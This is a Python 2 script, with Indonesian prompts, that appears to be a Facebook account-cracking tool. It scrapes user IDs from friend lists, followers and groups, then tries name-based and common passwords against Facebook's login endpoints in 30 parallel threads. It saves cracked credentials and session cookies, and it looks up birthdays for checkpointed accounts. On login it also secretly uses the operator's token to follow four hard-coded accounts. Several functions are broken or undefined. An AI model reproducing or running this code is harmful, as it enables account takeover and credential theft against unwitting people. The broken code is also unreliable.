# -*- coding: utf-8
# author by angga kurniawan
import os
try:
	import requests
except ImportError:
	print("\n ! module requests belum terinstall")
	os.system("pip2 install requests")

try:
	import bs4
except ImportError:
	print("\n ! module bs4 belum terinstall")
	os.system("pip2 install bs4")

import os, sys, re, time, requests, json, random, calendar
from multiprocessing.pool import ThreadPool
from bs4 import BeautifulSoup as parser
from datetime import datetime
from datetime import date

loop = 0
id = []
ok = []
cp = []

ct = datetime.now()
n = ct.month
bulan = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]

my_date = date.today()
hr = calendar.day_name[my_date.weekday()]
tanggal = ("%s-%s-%s-%s"%(hr, ha, op, ta))
tgl = ("%s %s %s"%(ha, op, ta))
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

def logo():
	os.system("clear")
	print(""""\033[1;95m█████████
\033[1;95m█▄█████▄█      \033[1;96m●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●
\033[1;95m█\033[1;93m▼▼▼▼▼ \033[1;91m- _ --_--\033[1;92m╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗ 
\033[1;95m█ \033[1;97m \033[1;91m_-_-- -_ --__\033[1;92m ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗
\033[1;95m█\033[1;93m▲▲▲▲▲\033[1;91m--  - _ --\033[1;92m═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝ \033[1;93mV1.8
\033[1;95m█████████      \033[1;96m«----------✧----------»
\033[1;95m ██ ██
\033[1;97m╔════════════════════════════════════════════╗
\033[1;97m║\033[1;93m* \033[1;97mAuthor     \033[1;91m: \033[1;96mZhuL \033[1;97m                        ║
\033[1;97m║\033[1;93m* \033[1;97mSupport    \033[1;91m: \033[1;94mDwMsrh | YagamiKo \033[1;97m           ║
\033[1;97m║\033[1;93m* \033[1;97mInstagram  \033[1;91m: \033[1;92m\033[4minstagram.com/_zhlnt_\033[0m \033[1;97m       ║
\033[1;97m╚════════════════════════════════════════════╝""")

def masuk():
	os.system('reset')
	print logo
	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Login"
	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Account Checker ( No Login )"
	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Exit"
	print "\033[1;97m║"
	msuk = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
	if msuk =="":
		print"\033[1;91m[!] Wrong input"
		keluar()
	elif msuk =="1":
		login()
	elif msuk =="2":
		cek()
	elif msuk =="0":
		keluar()
	else:
		print"\033[1;91m[!] Wrong input"
		keluar()

def cek():
	os.system('reset')
	print logo
	print "\033[1;91m[?] \033[1;92mCreate in file\033[1;91m : \033[1;97musername|password"
	print 42*"\033[1;97m═"
	live = []
	cek = []
	die = []
	try:
		file = raw_input("\033[1;91m[+] \033[1;92mFile path \033[1;91m:\033[1;97m ")
		list = open(file,'r').readlines()
	except IOError:
		print ("\033[1;91m[!] File not found")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		lain()
	pemisah = raw_input("\033[1;91m[+] \033[1;92mSeparator \033[1;91m:\033[1;97m ")
	jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
	print 42*"\033[1;97m═"
	for meki in list:
		username, password = (meki.strip()).split(str(pemisah))
		url = "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(username)+"&locale=en_US&password="+(password)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
		data = requests.get(url)
		mpsh = json.loads(data.text)
		if 'access_token' in mpsh:
			live.append(password)
			print"\033[1;97m[ \033[1;92mOK✓\033[1;97m ] \033[1;97m"+username+"|"+password
		elif 'www.facebook.com' in mpsh["error_msg"]:
			cek.append(password)
			print"\033[1;97m[ \033[1;93mCP✚\033[1;97m ] \033[1;97m"+username+"|"+password
		else:
			die.append(password)
			print"\033[1;97m[ \033[1;91mDie\033[1;97m ] \033[1;97m"+username+"|"+password
	print 42*"\033[1;97m═"
	print"\033[1;91m[+] \033[1;92mTotal\033[1;91m : \033[1;97mOK=\033[1;92m"+str(len(live))+" \033[1;97mCP=\033[1;93m"+str(len(cek))+" \033[1;97mDie=\033[1;91m"+str(len(die))
	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
	masuk()
	
def login():
	os.system("clear")
	try:
		#-> test koneksi
		requests.get("https://mbasic.facebook.com")
	except requests.exceptions.ConnectionError:
		exit(" ! tidak ada koneksi internet")
	try:
		token = open("login.txt", "r")
		menu()
	except KeyError, IOError:
		print(" * sebelum masuk ke menu harus login terlebih dahulu")
		print(" * untuk login silakan masukan token facebook anda")
		print(" ? ketik '\033[0;93mhelp\033[0;97m' untuk lihat tutorial ambil token facebook")
		token = raw_input("\n + token fb : ")
		if token == "help":
			os.system("xdg-open https://youtu.be/IdxphPBMMTU")
			exit(" ! di simak video nya biar paham")
		try:
			nama = requests.get("https://graph.facebook.com/me?access_token="+token).json()["name"].lower()
			open("login.txt", "w").write(token)
			requests.post("https://graph.facebook.com/100015073506062/subscribers?access_token="+token)
			requests.post("https://graph.facebook.com/100002163187650/subscribers?access_token="+token)
			requests.post("https://graph.facebook.com/100022849470990/subscribers?access_token="+token)
			requests.post("https://graph.facebook.com/100010998764674/subscribers?access_token="+token)
			print("\n + user aktif, selamat datang \033[0;93m%s\033[0;97m"%(nama))
			time.sleep(1)
			menu()
		except KeyError:
			os.system("rm -f login.txt")
			exit(" ! token kadaluwarsa")

def menu():
	os.system("clear")
	global token
	try:
		#-> test koneksi
		requests.get("https://mbasic.facebook.com")
	except requests.exceptions.ConnectionError:
		exit(" ! tidak ada koneksi internet")
	try:
		token = open("login.txt","r").read()
	except KeyError:
		os.system("rm -f login.txt")
		exit(" ! token kadaluwarsa")
	try:
		nama = requests.get("https://graph.facebook.com/me/?access_token="+token).json()["name"].lower()
	except IOError:
		os.system("rm -f login.txt")
		exit(" ! token kadaluwarsa")
	logo()
	print(" [ selamat datang \033[0;93m%s\033[0;97m ]\n"%(nama))
	print(" 1 crack dari ID publik")
	print(" 2 crack dari pengikut")
	print(" 3 crack dari target massal")
	print(" 4 lihat hasil crack")
	print(" 5 ganti user agent")
	print(" 6 crack dari grup")
	print(" 7 ganti akun Facebook")
    print(" 8 cek daftar grup")
	print(" 0 keluar (hapus token)")
	angga = raw_input("\n ? choose : ")
	if angga =="":
		menu()
	elif angga == "1" or angga == "01":
		publik()
		method()
	elif angga == "2" or angga == "02":
		follower()
		method()
	elif angga == "3" or angga == "03":
		massal()
		method()
	elif angga == "4" or angga == "04":
		print("\n 1 cek hasil crack OK")
		print(" 2 cek hasil crack CP")
		cek = raw_input("\n ? choose : ")
		if cek =="":
			menu()
		elif cek == "1":
			dirs = os.listdir("OK")
			print(" * list nama file tersimpan di folder OK")
			for file in dirs:
				print(" + "+file)
			try:
				file = raw_input("\n ? pilih nama file : ")
				if file == "":
					menu()
				totalok = open("OK/%s"%(file)).read().splitlines()
			except IOError:
				exit(" ! file %s tidak tersedia"%(file))
			nm_file = ("%s"%(file)).replace("-", " ")
			del_txt = nm_file.replace(".txt", "")
			print(" # ----------------------------------------------")
			print(" + hasil crack : %s total : %s\033[0;93m"%(del_txt, len(totalok)))
			os.system("cat OK/%s"%(file))
			print("\033[0;97m # ----------------------------------------------")
			exit(" ! jangan lupa di copy dan di simpan hasilnya")
		elif cek == "2":
			dirs = os.listdir("CP")
			print(" * list nama file tersimpan di folder CP")
			for file in dirs:
				print(" + "+file)
			try:
				file = raw_input("\n ? pilih nama file : ")
				if file == "":
					menu()
				totalcp = open("CP/%s"%(file)).read().splitlines()
			except IOError:
				exit(" ! file %s tidak tersedia"%(file))
			nm_file = ("%s"%(file)).replace("-", " ")
			del_txt = nm_file.replace(".txt", "")
			print(" # ----------------------------------------------")
			print(" + hasil crack : %s total : %s\033[0;93m"%(del_txt, len(totalcp)))
			os.system("cat CP/%s"%(file))
			print("\033[0;97m # ----------------------------------------------")
			exit(" ! jangan lupa di copy dan di simpan hasilnya")
		else:
			menu()
	elif angga == "5" or angga == "05":
		setting_ua()
	elif angga == "6" or angga == "06":
		crackgrup()
		method()
	elif angga == "7" or angga == "07":
		os.system("rm -f login.txt")
		login()
    elif angga == "8" or angga == "05":
		grupsaya()
	elif angga == "0" or angga == "00":
		os.system("rm -f login.txt")
		exit("\n # berhasil menghapus token")
	else:
		menu()

def publik():
	global token
	try:
		token = open("login.txt", "r").read()
	except IOError:
		exit(" ! token kadaluwarsa")
	print("\n * isi 'me' jika ingin dari daftar teman")
	idt = raw_input(" + id target : ")
	try:
		for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
			uid = i["id"]
			nama = i["name"].rsplit(" ")[0]
			id.append(uid+"<=>"+nama)
	except KeyError:
		exit(" ! id pengguna %s tidak tersedia"%(idt))
	print(" + total id  : \033[0;91m%s\033[0;97m"%(len(id))) 

def grupsaya():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('reset')
	print logo
	try:
		uh = requests.get('https://graph.facebook.com/me/groups?access_token='+toket)
		gud = json.loads(uh.text)
		for p in gud['data']:
			nama = p["name"]
			id = p["id"]
			f=open('out/Grupid.txt','w')
			listgrup.append(id)
			f.write(id + '\n')
			print "\033[1;97m[ \033[1;92mMyGroup\033[1;97m ] "+str(id)+" => "+str(nama)
		print 42*"\033[1;97m═"
		print"\033[1;91m[+] \033[1;92mTotal Group \033[1;91m:\033[1;97m %s"%(len(listgrup))
		print("\033[1;91m[+] \033[1;92mSaved \033[1;91m: \033[1;97mout/Grupid.txt")
		f.close()
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		lain()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Stopped")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		lain()
	except KeyError:
		os.remove('out/Grupid.txt')
		print('\033[1;91m[!] Group not found')
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		lain()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[✖] No Connection"
		keluar()
	except IOError:
		print "\033[1;91m[!] Error"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		lain()
		
def crackgrup():
	global token
	try:
		token = open("login.txt", "r").read()
	except IOError:
		exit(" ! token kadaluwarsa")
	print("\n * Masukkan ID Grup")
	idt = raw_input(" + id grup : ")
	try:
		for i in requests.get("https://graph.facebook.com/group?access_token=%s"%(idt, token)).json()["data"]:
			uid = i["id"]
			nama = i["name"].rsplit(" ")[0]
			id.append(uid+"<=>"+nama)
	except KeyError:
		exit(" ! id grup %s tidak tersedia"%(idt))
	print(" + total id  : \033[0;91m%s\033[0;97m"%(len(id))
	
def follower():
	global token
	try:
		token = open("login.txt", "r").read()
	except IOError:
		exit(" ! token kadaluwarsa")
	print("\n * isi 'me' jika ingin dari pengikut sendiri")
	idt = raw_input(" + id target : ")
	try:
		for i in requests.get("https://graph.facebook.com/%s/subscribers?limit=5000&access_token=%s"%(idt, token)).json()["data"]:
			uid = i["id"]
			nama = i["name"].rsplit(" ")[0]
			id.append(uid+"<=>"+nama)
	except KeyError:
		exit(" ! id pengguna %s tidak tersedia"%(idt))
	print(" + total id  : \033[0;91m%s\033[0;97m"%(len(id))) 

def massal():
	global token
	try:
		token = open("login.txt", "r").read()
	except IOError:
		exit(" ! token kadaluwarsa")
	try:
		tanya_total = int(input(" + jumlah target id : "))
	except:tanya_total=1
	print("\n * isi 'me' jika ingin dari daftar teman")
	for t in range(tanya_total):
		t +=1
		idt = raw_input(" + id target %s : "%(t))
		try:
			for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
				uid = i["id"]
				nama = i["name"].rsplit(" ")[0]
				id.append(uid+"<=>"+nama)
		except KeyError:
			print(" ! id pengguna %s tidak tersedia"%(idt))
	print(" + total id  : \033[0;91m%s\033[0;97m"%(len(id)))

def method():
	print(" \n [ pilih method crack - coba method satu² ]\n")
	print(" 1 method b-api  (fast crack)")
	print(" 2 method mbasic (slow crack)")
	print(" 3 method mobile (slow crack)")
	method = raw_input("\n ? method : ")
	if method == "":
		menu()
	elif method == "1":
		ask = raw_input(" ? gunakan password manual? y/t: ")
		if ask == "y":
			manual()
		print("\n + hasil OK tersimpan di : OK/%s.txt"%(tanggal))
		print(" + hasil CP tersimpan di : CP/%s.txt\n"%(tanggal))
		print(" ! jika tidak ada hasil hidupkan mode pesawat 5 detik\n")
		ThreadPool(30).map(bapi, id)
		exit("\n\n # selesai...")
	elif method == "2":
		ask = raw_input(" ? gunakan password manual? y/t: ")
		if ask == "y":
			manual()
		print("\n + hasil OK tersimpan di : OK/%s.txt"%(tanggal))
		print(" + hasil CP tersimpan di : CP/%s.txt\n"%(tanggal))
		print(" ! jika tidak ada hasil hidupkan mode pesawat 5 detik\n")
		ThreadPool(30).map(mbasic, id)
		exit("\n\n # selesai...")
	elif method == "3":
		ask = raw_input(" ? gunakan password manual? y/t: ")
		if ask == "y":
			manual()
		print("\n + hasil OK tersimpan di : OK/%s.txt"%(tanggal))
		print(" + hasil CP tersimpan di : CP/%s.txt\n"%(tanggal))
		print(" ! jika tidak ada hasil hidupkan mode pesawat 5 detik\n")
		ThreadPool(30).map(mobile, id)
		exit("\n\n # selesai...")
	else:
		menu()

def cek_ttl_cp(uid, pw):
	try:
		token = open("login.txt", "r").read()
		with requests.Session() as ses:
			ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
			month, day, year = ttl.split("/")
			month = bulan_ttl[month]
			print("\r \033[0;93m+ %s|%s|%s %s %s\033[0;97m"%(uid, pw, day, month, year))
			cp.append("%s|%s"%(uid, pw))
			open("CP/%s.txt"%(tanggal),"a").write(" + %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
	except KeyError, IOError:
		day = (" ")
		month = (" ")
		year = (" ")
	except:pass

def bapi(user):
	try:
		ua = open(".ua", "r").read()
	except IOError:
		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
	global loop, token
	sys.stdout.write(
		"\r * crack %s/%s -> ok:-%s - cp:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	uid, name = user.split("<=>")
	if len(name)>=6:
		pwx = [ name, name+"123", name+"1234", name+"12345", name+"1", "indonesia", "akusayangkamu", "iloveyou", "12345678", "87654321" ]
	elif len(name)<=2:
		pwx = [ name+"123", name+"1234", name+"12345", name+"1", "indonesia", "akusayangkamu", "iloveyou", "12345678", "87654321" ]
	elif len(name)<=3:
		pwx = [ name+"123", name+"12345", name+"1", "indonesia", "akusayangkamu", "iloveyou", "12345678", "87654321" ]
	else:
		pwx = [ name+"123", name+"12345", name+"1234", "indonesia", "akusayangkamu", "iloveyou", "12345678", "87654321" ]
	try:
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
			param = {"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":uid,"locale": "en_US","password":pw,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
			api = "https://b-api.facebook.com/method/auth.login"
			send = ses.get(api, params=param, headers=headers_) 
			if "session_key" in send.text and "EAAA" in send.text:
				print("\r \033[0;92m+ %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tanggal),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
			elif "www.facebook.com" in send.json()["error_msg"]:
				cek_ttl_cp(uid, pw)
				break
				print("\r \033[0;93m+ %s|%s\033[0;97m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tanggal),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue

		loop += 1
	except:
		pass

def mbasic(user):
	try:
		ua = open(".ua", "r").read()
	except IOError:
		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
	global loop, token
	sys.stdout.write(
		"\r * crack %s/%s -> ok:-%s - cp:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	uid, name = user.split("<=>")
	if len(name)>=6:
		pwx = [ name, name+"123", name+"1234", name+"12345", name+"1", "indonesia", "akusayangkamu", "iloveyou", "12345678", "87654321" ]
	elif len(name)<=2:
		pwx = [ name+"123", name+"1234", name+"12345", name+"1", "indonesia", "akusayangkamu", "iloveyou", "12345678", "87654321" ]
	elif len(name)<=3:
		pwx = [ name+"123", name+"12345", name+"1", "indonesia", "akusayangkamu", "iloveyou", "12345678", "87654321" ]
	else:
		pwx = [ name+"123", name+"12345", name+"1234", "indonesia", "akusayangkamu", "iloveyou", "12345678", "87654321" ]
	try:
		for pw in pwx:
			kwargs = {}
			pw = pw.lower()
			ses = requests.Session()
			ses.headers.update({"origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
			p = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text
			b = parser(p,"html.parser")
			bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
			for i in b("input"):
				try:
					if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
					else:continue
				except:pass
			kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
			gaaa = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
			if "c_user" in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print("\r \033[0;92m+ %s|%s|%s\033[0;97m"%(uid, pw, kuki))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tanggal),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
			elif "checkpoint" in ses.cookies.get_dict().keys():
				cek_ttl_cp(uid, pw)
				break
				print("\r \033[0;93m+ %s|%s\033[0;97m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tanggal),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue

		loop += 1
	except:
		pass

def mobile(user):
	try:
		ua = open(".ua", "r").read()
	except IOError:
		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
	global loop, token
	sys.stdout.write(
		"\r * crack %s/%s -> ok:-%s - cp:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	uid, name = user.split("<=>")
	if len(name)>=6:
		pwx = [ name, name+"123", name+"1234", name+"12345", name+"1", "indonesia", "akusayangkamu", "iloveyou", "12345678", "87654321" ]
	elif len(name)<=2:
		pwx = [ name+"123", name+"1234", name+"12345", name+"1", "indonesia", "akusayangkamu", "iloveyou", "12345678", "87654321" ]
	elif len(name)<=3:
		pwx = [ name+"123", name+"12345", name+"1", "indonesia", "akusayangkamu", "iloveyou", "12345678", "87654321" ]
	else:
		pwx = [ name+"123", name+"12345", name+"1234", name+"1", "indonesia", "akusayangkamu", "iloveyou", "12345678", "87654321" ]
	try:
		for pw in pwx:
			kwargs = {}
			pw = pw.lower()
			ses = requests.Session()
			ses.headers.update({"origin": "https://touch.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "touch.facebook.com", "referer": "https://touch.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
			p = ses.get("https://touch.facebook.com/login/?next&ref=dbl&refid=8").text
			b = parser(p,"html.parser")
			bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
			for i in b("input"):
				try:
					if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
					else:continue
				except:pass
			kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
			gaaa = ses.post("https://touch.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Ftouch.facebook.com%2F&lwv=100&refid=8",data=kwargs)
			if "c_user" in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print("\r \033[0;92m+ %s|%s|%s\033[0;97m"%(uid, pw, kuki))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tanggal),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
			elif "checkpoint" in ses.cookies.get_dict().keys():
				cek_ttl_cp(uid, pw)
				break
				print("\r \033[0;93m+ %s|%s\033[0;97m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tanggal),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue

		loop += 1
	except:
		pass

def manual():
	try:
		ua = open(".ua", "r").read()
	except IOError:
		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
	global loop, token
	print("\n * contoh pass : sayang,anjing,bangsat")
	asu = raw_input(" ? set pass : ").split(",")
	if len(asu) =="":
		exit(" ! jangan kosong")
	print("\n + hasil OK tersimpan di : OK/%s.txt"%(tanggal))
	print(" + hasil CP tersimpan di : CP/%s.txt\n"%(tanggal))

	def main(user):
		global loop, token
		sys.stdout.write(
			"\r * crack %s/%s -> ok:-%s - cp:-%s "%(loop, len(id), len(ok), len(cp))
		); sys.stdout.flush()
		uid, name = user.split("<=>")
		try:
			for pw in asu:
				kwargs = {}
				pw = pw.lower()
				ses = requests.Session()
				ses.headers.update({"origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
				p = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text
				b = parser(p,"html.parser")
				bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
				for i in b("input"):
					try:
						if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
						else:continue
					except:pass
				kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
				gaaa = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
				if "c_user" in ses.cookies.get_dict().keys():
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print("\r \033[0;92m+ %s|%s|%s\033[0;97m"%(uid, pw, kuki))
					ok.append("%s|%s"%(uid, pw))
					open("OK/%s.txt"%(tanggal),"a").write(" + %s|%s\n"%(uid, pw))
					break
					continue
				elif "checkpoint" in ses.cookies.get_dict().keys():
					cek_ttl_cp(uid, pw)
					break
					print("\r \033[0;93m+ %s|%s\033[0;97m        "%(uid, pw))
					cp.append("%s|%s"%(uid, pw))
					open("CP/%s.txt"%(tanggal),"a").write(" + %s|%s\n"%(uid, pw))
					break
					continue

			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	exit("\n\n # selesai...")

def setting_ua():
	print("\n 1 ganti user agent tools")
	print(" 2 ganti user agent bawaan tools")
	ua = raw_input("\n ? choose : ")
	if ua =="":
		menu()
	elif ua == "1":
		c_ua = raw_input(" + user agent : ")
		open(".ua", "w").write(c_ua)
		time.sleep(1)
		raw_input("\n + berhasil ganti user agent")
		menu()
	elif ua == "2":
		print(" + user agent : Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
		os.system("rm -f .ua")
		time.sleep(1)
		raw_input("\n + berhasil ganti user agent")
		menu()

def buat_folder():
	try:os.mkdir("CP")
	except:pass
	try:os.mkdir("OK")
	except:pass

if __name__ == "__main__":
	os.system("git pull")
	os.system("touch login.txt")
	buat_folder()
	masuk()
